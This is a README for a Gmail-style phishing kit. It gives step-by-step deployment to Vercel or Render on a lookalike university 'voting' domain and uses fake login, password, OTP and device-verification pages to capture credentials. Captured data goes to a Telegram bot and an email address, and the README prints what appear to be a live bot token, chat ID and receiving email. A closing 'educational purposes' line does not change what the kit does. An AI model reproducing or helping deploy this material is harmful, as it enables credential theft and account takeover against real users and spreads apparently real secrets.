# Gmail Phishing System

A professional Gmail-style login phishing system with Telegram integration, email logging, and multiple verification methods.

## 🚀 Features

- Authentic Gmail login UI design
- Responsive layout with mobile support
- Telegram bot integration
- Email notifications
- Multiple verification methods (Device, Number Selection, OTP)
- Professional footer with language and copyright
- Secure data handling
- Control panel for managing verifications

## 🛠️ Tech Stack

- **CSS3** - Modern styling with Gmail-inspired design
- **JavaScript** - Form handling and dynamic interactions
- **PHP** - Backend processing and API integrations
- **Vercel** - Cloud hosting and deployment

## 📦 Installation & Setup

### Prerequisites
- PHP 8.2+
- Composer
- Git

### Local Development

1. Clone the repository:
```bash
git clone <your-repo-url>
cd gmail-phis
```

2. Install dependencies:
```bash
composer install
```

3. Set up environment variables in `.env`:
```bash
TELEGRAM_BOT_TOKEN=8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY
TELEGRAM_CHAT_ID=6037378895
RECEIVE_EMAIL=davidmassmutual@gmail.com
```

4. Start local server:
```bash
composer run start
```

5. Visit `http://localhost:8000`

## 🚀 Deployment to Vercel (Recommended)

### Step 1: Prepare Files
All necessary deployment files are configured:
- `vercel.json` - Vercel deployment configuration
- `composer.json` - PHP configuration
- `.gitignore` - Excludes sensitive files

### Step 2: Quick Deploy (Recommended)
Run the automated deployment script:
```bash
./deploy.sh
```

### Alternative: Manual Deployment

#### Install Vercel CLI
```bash
npm install -g vercel
```

#### Deploy to Vercel
```bash
# Login to Vercel
vercel login

# Deploy your project
vercel --prod
```

### Step 4: Add Custom Domain
1. **Go to your Vercel dashboard**
2. **Select your project**
3. **Go to Settings → Domains**
4. **Add your domain:** `americanuniversityofdubaispotlight.com`
5. **Follow DNS configuration instructions**

### Step 5: Configure Environment Variables
In your Vercel project dashboard, add these environment variables:
- `TELEGRAM_BOT_TOKEN` = `8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY`
- `TELEGRAM_CHAT_ID` = `6037378895`
- `RECEIVE_EMAIL` = `davidmassmutual@gmail.com`

### Step 6: Access Your Site
Your site will be available at: `https://americanuniversityofdubaispotlight.com`

## 🚀 Alternative: Deployment to Render

### Step 1: Prepare Files
All necessary deployment files are already configured:
- `composer.json` - PHP configuration
- `render.yaml` - Deployment configuration 
- `.gitignore` - Excludes sensitive files

### Step 2: Push to GitHub
```bash
git add .
git commit -m "Ready for Render deployment"
git push origin main
```

### Step 3: Deploy on Render

1. **Go to [render.com](https://render.com) and sign up**
2. **Connect your GitHub repository**
3. **Create new Web Service:**
   - Choose your repository
   - Set **Runtime** to `PHP`
   - **Build Command:** `composer install --no-dev --optimize-autoloader`
   - **Start Command:** `php -S 0.0.0.0:$PORT index.php`

### Step 4: Configure Environment Variables
In your Render dashboard, add these environment variables:
- `TELEGRAM_BOT_TOKEN` = `8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY` (mark as Secret)
- `TELEGRAM_CHAT_ID` = `6037378895` (mark as Secret)  
- `RECEIVE_EMAIL` = `davidmassmutual@gmail.com` (mark as Secret)

### Step 5: Deploy
Click **Create Web Service** and wait for deployment. You'll get a URL like `https://your-app.onrender.com`

## 🔧 Configuration

### Telegram Bot Setup
1. Message [@BotFather](https://t.me/BotFather) on Telegram
2. Create a new bot with `/newbot`
3. Get your **BOT TOKEN** and **CHAT ID**
4. Update environment variables in Render

### Email Configuration
Update `RECEIVE_EMAIL` in Render environment variables to receive login notifications.

## 📁 Project Structure

```
gmail-phis/
├── index.html            # Main voting page
├── login.html            # Email/phone login page
├── password.html         # Password entry page
├── otp.html              # OTP verification page
├── device_verify.html    # Device verification page
├── choose_number.html    # Number selection page
├── control.html          # Admin control panel
├── index.php             # Main entry point
├── next.php              # Telegram & email handler
├── verify.php            # Verification logic handler
├── cron.php              # Keep-alive endpoint
├── composer.json         # PHP dependencies
├── vercel.json           # Vercel deployment config
├── render.yaml           # Render deployment config
├── requirements.txt      # Python dependencies
├── keep_alive.py         # Keep-alive worker
├── .gitignore            # Git ignore rules
├── assets/               # Static assets
│   ├── bootstrap/        # Bootstrap framework
│   └── css/              # Custom styles
├── images/               # Logo and image files
└── README.md             # This file
```

## 🔒 Security Features

- Input sanitization and validation
- Secure environment variable handling
- HTTPS only (enforced by Vercel/Render)
- CORS headers configured
- No sensitive data in source code

## 🌐 Live Testing

Once deployed, test your phishing system:
1. Visit your domain: `https://americanuniversityofdubaispotlight.com`
2. Click "Vote with Gmail" to start the flow
3. Enter test email/phone and password
4. Check Telegram for notifications
5. Use control panel at `/control.html` to manage verifications

## 📊 Monitoring

- Check `debug.log` for server logs
- Monitor Telegram bot for successful notifications
- View Vercel dashboard for deployment status and analytics
- Access control panel to manage active verifications

## 🤝 Support

For issues with:
- **Domain setup**: Ensure DNS is properly configured in Vercel
- **Telegram bot**: Ensure bot token and chat ID are correct
- **Email delivery**: Check spam folder
- **Deployment**: Verify environment variables in Vercel dashboard

## 📜 License

This project is for educational and demonstration purposes.

---

**Happy deploying! 🚀**
